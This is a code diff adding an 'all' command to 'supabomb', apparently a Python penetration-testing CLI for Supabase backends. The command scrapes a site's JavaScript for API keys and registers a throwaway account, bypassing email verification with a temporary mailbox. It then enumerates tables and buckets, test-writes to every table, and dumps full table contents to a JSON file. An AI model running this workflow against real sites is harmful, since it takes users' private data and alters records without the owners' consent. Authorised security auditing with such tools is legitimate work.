@@ -594,6 +594,574 @@ def dump(project_ref, anon_key, output, use_anon):
 
 
 @cli.command()
+@click.option('--url', '-u', help='Target URL to discover Supabase credentials')
+@click.option('--project-ref', '-p', help='Supabase project reference (alternative to URL)')
+@click.option('--anon-key', '-k', help='Supabase anonymous API key (required with project-ref)')
+@click.option('--output', '-o', required=True, help='Output file for comprehensive results (JSON)')
+@click.option('--test-write', is_flag=True, help='Test INSERT/UPDATE/DELETE permissions')
+@click.option('--sample-size', '-s', default=5, help='Number of sample rows per table (default: 5)')
+@click.option('--katana', is_flag=True, help='Use Katana for deep discovery (if URL provided)')
+@click.option('--max-js-files', default=50, help='Maximum JS files with Katana (default: 50)')
+@click.option('--katana-timeout', default=120, help='Katana timeout in seconds (default: 120)')
+@click.option('--verify-email', is_flag=True, help='Automatically verify email during signup')
+@click.option('--verbose', '-v', is_flag=True, help='Show detailed output')
+def all(url, project_ref, anon_key, output, test_write, sample_size, katana,
+        max_js_files, katana_timeout, verify_email, verbose):
+    """Run complete Supabase analysis workflow.
+
+    This command performs discovery, registration, enumeration, and data dumping in one go.
+    Requires either --url for discovery or --project-ref and --anon-key for direct access.
+
+    Examples:
+
+        supabomb all --url https://example.com --output report.json
+
+        supabomb all -p abc123xyz -k eyJ... --output report.json --test-write
+
+        supabomb all --url https://example.com --katana --test-write -o full_report.json
+    """
+    import random
+    import string
+    from datetime import datetime
+
+    console.print("\n[bold cyan]═══════════════════════════════════════════════════[/bold cyan]")
+    console.print("[bold cyan]      SUPABOMB - COMPREHENSIVE ANALYSIS MODE      [/bold cyan]")
+    console.print("[bold cyan]═══════════════════════════════════════════════════[/bold cyan]\n")
+
+    # Initialize results dictionary
+    results = {
+        'timestamp': datetime.utcnow().isoformat(),
+        'discovery': None,
+        'credentials': None,
+        'signup': None,
+        'enumeration': None,
+        'dump': None,
+        'summary': {}
+    }
+
+    # ============================================================================
+    # PHASE 1: DISCOVERY OR CREDENTIALS
+    # ============================================================================
+    console.print("[bold cyan]▶ Phase 1: Credentials Acquisition[/bold cyan]\n")
+
+    credentials = None
+
+    if url:
+        # Discovery mode
+        console.print(f"[bold cyan]Discovering from URL:[/bold cyan] {url}\n")
+        discovery = SupabaseDiscovery()
+
+        if katana:
+            console.print(f"[dim]Using Katana (max files: {max_js_files}, timeout: {katana_timeout}s)[/dim]")
+            with console.status("[bold green]Running Katana crawler..."):
+                discovery_result = discovery.discover_with_katana(
+                    url, max_files=max_js_files, timeout=katana_timeout, verbose=verbose
+                )
+        else:
+            with console.status("[bold green]Scanning for Supabase..."):
+                discovery_result = discovery.discover_from_url(url)
+
+        if not discovery_result.found:
+            console.print("[bold red]✗ No Supabase instance found[/bold red]")
+            console.print("Cannot proceed without credentials")
+            raise click.Abort()
+
+        console.print("[bold green]✓ Supabase instance discovered![/bold green]")
+        credentials = discovery_result.credentials
+
+        # Save discovery results
+        results['discovery'] = {
+            'url': url,
+            'source': discovery_result.source,
+            'edge_functions': [
+                {
+                    'name': func.name,
+                    'args': func.args,
+                    'raw_args': func.raw_args,
+                    'invocation_example': func.invocation_example
+                }
+                for func in (discovery_result.edge_functions or [])
+            ]
+        }
+
+        # Display discovery info
+        display_discovery_result(discovery_result)
+
+        # Cache credentials
+        cache.add_discovery(credentials, source=discovery_result.source or f"url: {url}")
+        console.print(f"\n[dim]💾 Credentials cached[/dim]\n")
+
+    elif project_ref and anon_key:
+        # Direct credentials mode
+        console.print("[bold cyan]Using provided credentials[/bold cyan]\n")
+        credentials = SupabaseCredentials(
+            project_ref=project_ref,
+            anon_key=anon_key,
+            url=f"https://{project_ref}.supabase.co"
+        )
+        console.print(f"[green]✓[/green] Project: {project_ref}")
+        console.print(f"[green]✓[/green] URL: {credentials.url}\n")
+
+    else:
+        console.print("[bold red]Error:[/bold red] Must provide either --url OR (--project-ref and --anon-key)")
+        raise click.Abort()
+
+    # Store credentials in results
+    results['credentials'] = {
+        'project_ref': credentials.project_ref,
+        'url': credentials.url,
+        'anon_key': credentials.anon_key
+    }
+
+    # Test connection
+    console.print("[bold cyan]Testing connection...[/bold cyan]")
+    client = SupabaseClient(credentials)
+    success, error = client.test_connection()
+
+    if not success:
+        console.print(f"[bold red]✗ Connection failed:[/bold red] {error}")
+        raise click.Abort()
+
+    console.print("[bold green]✓ Connection successful[/bold green]\n")
+
+    # ============================================================================
+    # PHASE 2: USER REGISTRATION
+    # ============================================================================
+    console.print("[bold cyan]▶ Phase 2: User Registration[/bold cyan]\n")
+
+    # Check auth settings
+    with console.status("[bold green]Checking auth settings..."):
+        success, settings, error = client.get_auth_settings()
+
+    if not success:
+        console.print(f"[yellow]⚠ Could not fetch auth settings: {error}[/yellow]")
+        console.print("[dim]Skipping registration phase[/dim]\n")
+        results['signup'] = {'status': 'skipped', 'reason': 'auth_settings_unavailable'}
+    elif settings.get('disable_signup'):
+        console.print("[yellow]⚠ Signups are disabled[/yellow]")
+        console.print("[dim]Skipping registration phase[/dim]\n")
+        results['signup'] = {'status': 'skipped', 'reason': 'signups_disabled'}
+    elif not settings.get('external', {}).get('email'):
+        console.print("[yellow]⚠ Email authentication is disabled[/yellow]")
+        console.print("[dim]Skipping registration phase[/dim]\n")
+        results['signup'] = {'status': 'skipped', 'reason': 'email_auth_disabled'}
+    else:
+        # Attempt registration
+        mailer_autoconfirm = settings.get('mailer_autoconfirm', False)
+        temp_email_obj = None
+
+        # Generate credentials
+        random_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+        email = f"test_{random_id}@supabomb.local"
+        password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%', k=16))
+
+        console.print(f"[dim]Generated email:[/dim] {email}")
+        console.print(f"[dim]Generated password:[/dim] {password}")
+
+        # Handle email verification if needed
+        if not mailer_autoconfirm and verify_email:
+            console.print("[dim]Email verification required - using temporary email[/dim]")
+            from .email_utils import create_temp_email
+            try:
+                temp_email_obj = create_temp_email()
+                email = temp_email_obj.address
+                console.print(f"[dim]Created temporary email:[/dim] {email}")
+            except Exception as e:
+                console.print(f"[yellow]⚠ Could not create temp email: {e}[/yellow]")
+                console.print("[dim]Continuing with generated email (may require manual verification)[/dim]")
+
+        # Signup
+        console.print(f"\n[bold cyan]Registering user...[/bold cyan]")
+        with console.status("[bold green]Creating account..."):
+            success, response, error = client.signup_user(email, password)
+
+        if not success:
+            console.print(f"[yellow]⚠ Signup failed: {error}[/yellow]")
+            results['signup'] = {
+                'status': 'failed',
+                'email': email,
+                'error': error
+            }
+        else:
+            # Check if immediate access granted
+            if 'access_token' in response:
+                console.print("[bold green]✓ Signup successful! (No verification required)[/bold green]")
+
+                # Save session
+                cache.add_user_session(
+                    project_ref=credentials.project_ref,
+                    email=email,
+                    password=password,
+                    access_token=response['access_token'],
+                    refresh_token=response['refresh_token'],
+                    user_id=response['user']['id']
+                )
+
+                results['signup'] = {
+                    'status': 'success',
+                    'email': email,
+                    'password': password,
+                    'user_id': response['user']['id'],
+                    'role': response['user']['role'],
+                    'created_at': response['user']['created_at'],
+                    'email_verified': True
+                }
+
+                console.print(f"[green]✓[/green] User ID: {response['user']['id']}")
+                console.print(f"[green]✓[/green] Email: {email}")
+                console.print(f"[dim]💾 Session cached for authenticated queries[/dim]\n")
+
+            elif temp_email_obj:
+                # Email verification required
+                console.print("[bold cyan]⏳ Waiting for verification email...[/bold cyan]")
+                from .email_utils import wait_for_verification_email
+
+                verification_url = wait_for_verification_email(temp_email_obj, timeout=180, verbose=verbose)
+
+                if not verification_url:
+                    console.print("[yellow]⚠ No verification email received[/yellow]")
+                    results['signup'] = {
+                        'status': 'partial',
+                        'email': email,
+                        'password': password,
+                        'user_id': response.get('id'),
+                        'email_verified': False,
+                        'reason': 'verification_timeout'
+                    }
+                else:
+                    console.print("[bold green]✓ Email verified![/bold green]")
+
+                    # Click verification link
+                    import requests
+                    try:
+                        requests.get(verification_url)
+                        console.print("[green]✓[/green] Verification link clicked")
+                    except:
+                        pass
+
+                    # Login to get token
+                    with console.status("[bold green]Logging in..."):
+                        success, login_response, login_error = client.login_user(email, password)
+
+                    if success and 'access_token' in login_response:
+                        console.print("[bold green]✓ Login successful![/bold green]")
+
+                        # Save session
+                        cache.add_user_session(
+                            project_ref=credentials.project_ref,
+                            email=email,
+                            password=password,
+                            access_token=login_response['access_token'],
+                            refresh_token=login_response['refresh_token'],
+                            user_id=login_response['user']['id']
+                        )
+
+                        results['signup'] = {
+                            'status': 'success',
+                            'email': email,
+                            'password': password,
+                            'user_id': login_response['user']['id'],
+                            'role': login_response['user']['role'],
+                            'email_verified': True
+                        }
+
+                        console.print(f"[green]✓[/green] User ID: {login_response['user']['id']}")
+                        console.print(f"[dim]💾 Session cached[/dim]\n")
+                    else:
+                        console.print(f"[yellow]⚠ Login failed: {login_error}[/yellow]")
+                        results['signup'] = {
+                            'status': 'partial',
+                            'email': email,
+                            'password': password,
+                            'email_verified': True,
+                            'reason': 'login_failed'
+                        }
+            else:
+                console.print("[yellow]⚠ Email verification required but --verify-email not set[/yellow]")
+                results['signup'] = {
+                    'status': 'partial',
+                    'email': email,
+                    'password': password,
+                    'user_id': response.get('id'),
+                    'email_verified': False,
+                    'reason': 'manual_verification_required'
+                }
+
+        console.print()
+
+    # ============================================================================
+    # PHASE 3: ENUMERATION
+    # ============================================================================
+    console.print("[bold cyan]▶ Phase 3: Resource Enumeration[/bold cyan]\n")
+
+    # Check for authenticated session
+    user_session = cache.get_user_session(credentials.project_ref)
+    access_token = user_session.get('access_token') if user_session else None
+
+    if access_token:
+        console.print(f"[dim]🔐 Using authenticated session: {user_session['email']}[/dim]")
+        access_token = _ensure_valid_token(client, credentials, access_token)
+    else:
+        console.print("[dim]Using anonymous access[/dim]")
+
+    # Enumerate resources
+    enumerator = SupabaseEnumerator(client)
+
+    with console.status("[bold green]Enumerating resources..."):
+        tables = enumerator.enumerate_tables(sample_size=sample_size)
+        rpc_functions = enumerator.enumerate_rpc_functions()
+        buckets = enumerator.enumerate_storage_buckets()
+
+    console.print(f"[green]✓[/green] Found {len([t for t in tables if t.accessible])} accessible tables")
+    console.print(f"[green]✓[/green] Found {len(rpc_functions)} RPC functions")
+    console.print(f"[green]✓[/green] Found {len(buckets)} storage buckets\n")
+
+    # Get authenticated row counts if available
+    auth_counts = {}
+    if access_token:
+        with console.status("[bold green]Fetching authenticated row counts..."):
+            for table in tables:
+                if table.accessible:
+                    auth_count = client.count_table_rows_authenticated(table.name, access_token)
+                    auth_counts[table.name] = auth_count
+        console.print(f"[green]✓[/green] Retrieved authenticated counts\n")
+
+    # Test write permissions if requested
+    write_perms = {}
+    if test_write:
+        console.print("[bold cyan]Testing write permissions...[/bold cyan]\n")
+
+        import uuid
+        for i, table in enumerate([t for t in tables if t.accessible], 1):
+            if verbose:
+                console.print(f"[dim]Testing {table.name} ({i}/{len([t for t in tables if t.accessible])})...[/dim]")
+
+            # Generate test data
+            test_id = str(uuid.uuid4())
+            test_data = {}
+
+            if table.sample_data and len(table.sample_data) > 0:
+                template = table.sample_data[0]
+                for key, value in template.items():
+                    is_id_field = any(id_pattern in key.lower() for id_pattern in ['id', 'uuid', '_id', 'pk'])
+
+                    if is_id_field and key in ['id', 'uuid', 'pk']:
+                        test_data[key] = test_id
+                    elif is_id_field:
+                        test_data[key] = value
+                    elif isinstance(value, str):
+                        is_timestamp = any(pattern in key.lower() for pattern in ['created', 'updated', 'timestamp', '_at', 'date', 'time'])
+                        if is_timestamp or (value and ('T' in value or '-' in value) and len(value) > 10):
+                            test_data[key] = value
+                        else:
+                            test_data[key] = value[:-1] + 'X' if len(value) > 0 else 'supabomb_test'
+                    elif isinstance(value, (int, float)):
+                        test_data[key] = value + 1
+                    elif isinstance(value, bool):
+                        test_data[key] = not value
+                    else:
+                        test_data[key] = value
+
+            # Test operations
+            if access_token:
+                insert_success, inserted_data, insert_error = client.test_insert_authenticated(
+                    table.name, access_token, test_data
+                )
+            else:
+                insert_success, inserted_data, insert_error = client.test_insert(table.name, test_data)
+
+            update_success = False
+            delete_success = False
+
+            if insert_success and inserted_data:
+                inserted_row = inserted_data[0] if isinstance(inserted_data, list) else inserted_data
+
+                # Find ID field
+                actual_id = None
+                found_id_field = None
+                for id_field in ['id', 'uuid', '_id', 'pk'] + list(inserted_row.keys()):
+                    if id_field in inserted_row:
+                        actual_id = inserted_row[id_field]
+                        found_id_field = id_field
+                        break
+
+                if actual_id and found_id_field:
+                    match_filter = {found_id_field: f'eq.{actual_id}'}
+
+                    # Test UPDATE
+                    update_data = {}
+                    for key, value in inserted_row.items():
+                        if isinstance(value, str) and key != found_id_field:
+                            is_timestamp = any(pattern in key.lower() for pattern in ['created', 'updated', 'timestamp', '_at'])
+                            if not is_timestamp:
+                                update_data[key] = 'supabomb_updated'
+                                break
+
+                    if update_data:
+                        if access_token:
+                            update_success, _ = client.test_update_authenticated(
+                                table.name, access_token, match_filter, update_data
+                            )
+                        else:
+                            update_success, _ = client.test_update(table.name, match_filter, update_data)
+
+                    # Test DELETE
+                    if access_token:
+                        delete_success, _ = client.test_delete_authenticated(
+                            table.name, access_token, match_filter
+                        )
+                    else:
+                        delete_success, _ = client.test_delete(table.name, match_filter)
+
+            # Categorize results
+            if insert_success:
+                insert_status = 'allowed'
+            elif insert_error:
+                is_rls_block = any(x in insert_error.lower() for x in ['row-level security', 'rls', 'forbidden', 'permission'])
+                insert_status = 'denied' if is_rls_block else 'possible'
+            else:
+                insert_status = 'denied'
+
+            write_perms[table.name] = {
+                'insert': insert_status,
+                'update': 'allowed' if update_success else 'denied',
+                'delete': 'allowed' if delete_success else 'denied'
+            }
+
+        console.print(f"[green]✓[/green] Write permission testing complete\n")
+
+    # Display enumeration results
+    display_enumeration_results(tables, rpc_functions, buckets,
+                                 auth_counts if access_token else None,
+                                 write_perms if test_write else None)
+
+    # Store enumeration results
+    results['enumeration'] = {
+        'tables': [
+            {
+                'name': t.name,
+                'columns': t.columns,
+                'accessible': t.accessible,
+                'row_count': t.row_count,
+                'sample_data': t.sample_data[:2] if t.sample_data else [],  # Only store 2 samples
+                'authenticated_row_count': auth_counts.get(t.name) if access_token else None,
+                'write_permissions': write_perms.get(t.name) if test_write else None
+            }
+            for t in tables
+        ],
+        'rpc_functions': [
+            {
+                'name': f.name,
+                'parameters': f.parameters,
+                'accessible': f.accessible
+            }
+            for f in rpc_functions
+        ],
+        'storage_buckets': buckets
+    }
+
+    console.print()
+
+    # ============================================================================
+    # PHASE 4: DATA DUMP
+    # ============================================================================
+    console.print("[bold cyan]▶ Phase 4: Data Dump[/bold cyan]\n")
+
+    table_names = [t.name for t in tables if t.accessible]
+
+    if not table_names:
+        console.print("[yellow]⚠ No accessible tables to dump[/yellow]\n")
+        results['dump'] = {'status': 'skipped', 'reason': 'no_accessible_tables'}
+    else:
+        console.print(f"[dim]Dumping {len(table_names)} accessible tables...[/dim]\n")
+
+        dump_data = {}
+        successful_dumps = 0
+        failed_dumps = 0
+
+        for i, table_name in enumerate(table_names, 1):
+            with console.status(f"[bold green]Querying {i}/{len(table_names)}: {table_name}..."):
+                if access_token:
+                    success, data, error = client.query_table_authenticated(table_name, access_token, limit=None)
+                else:
+                    success, data, error = client.query_table(table_name, limit=None)
+
+            if success:
+                dump_data[table_name] = {
+                    'row_count': len(data) if data else 0,
+                    'data': data if data else []
+                }
+                successful_dumps += 1
+                console.print(f"  [green]✓[/green] {table_name}: {len(data) if data else 0} rows")
+            else:
+                dump_data[table_name] = {
+                    'error': error,
+                    'data': []
+                }
+                failed_dumps += 1
+                console.print(f"  [yellow]⚠[/yellow] {table_name}: {error}")
+
+        console.print(f"\n[green]✓[/green] Dump complete: {successful_dumps} successful, {failed_dumps} failed\n")
+
+        results['dump'] = {
+            'status': 'complete',
+            'tables': dump_data,
+            'successful_count': successful_dumps,
+            'failed_count': failed_dumps
+        }
+
+    # ============================================================================
+    # SUMMARY & OUTPUT
+    # ============================================================================
+    console.print("[bold cyan]▶ Generating Report[/bold cyan]\n")
+
+    results['summary'] = {
+        'credentials_acquired': True,
+        'user_registered': results['signup']['status'] in ['success', 'partial'] if results['signup'] else False,
+        'tables_discovered': len([t for t in tables if t.accessible]),
+        'rpc_functions_discovered': len(rpc_functions),
+        'storage_buckets_discovered': len(buckets),
+        'tables_dumped': results['dump'].get('successful_count', 0) if results['dump'] else 0,
+        'write_testing_performed': test_write,
+    }
+
+    # Save comprehensive report
+    console.print(f"[bold cyan]Saving report to:[/bold cyan] {output}")
+    save_json(output, results)
+
+    console.print("\n[bold cyan]═══════════════════════════════════════════════════[/bold cyan]")
+    console.print("[bold green]        ANALYSIS COMPLETE - REPORT SAVED         [/bold green]")
+    console.print("[bold cyan]═══════════════════════════════════════════════════[/bold cyan]\n")
+
+    # Display summary
+    summary_table = Table(show_header=False, box=box.ROUNDED, title="[bold cyan]Summary[/bold cyan]")
+    summary_table.add_column("Metric", style="cyan")
+    summary_table.add_column("Value", style="white")
+
+    summary_table.add_row("Project Reference", credentials.project_ref)
+    summary_table.add_row("Supabase URL", credentials.url)
+
+    if results['signup'] and results['signup']['status'] in ['success', 'partial']:
+        summary_table.add_row("Test User", results['signup']['email'])
+        summary_table.add_row("Test Password", results['signup']['password'])
+
+    summary_table.add_row("Tables Discovered", str(len([t for t in tables if t.accessible])))
+    summary_table.add_row("RPC Functions", str(len(rpc_functions)))
+    summary_table.add_row("Storage Buckets", str(len(buckets)))
+
+    if results['dump'] and results['dump'].get('status') == 'complete':
+        summary_table.add_row("Tables Dumped", f"{results['dump']['successful_count']}/{len(table_names)}")
+
+    if test_write:
+        summary_table.add_row("Write Testing", "Performed")
+
+    summary_table.add_row("Report File", output)
+
+    console.print(summary_table)
+    console.print()
+
+
+@cli.command()
 @click.option('--project-ref', '-p', help='Supabase project reference (optional if cached)')
 @click.option('--anon-key', '-k', help='Supabase anonymous API key (optional if cached)')
 @click.option('--edge-functions', '-e', multiple=True, help='Edge function names to test')
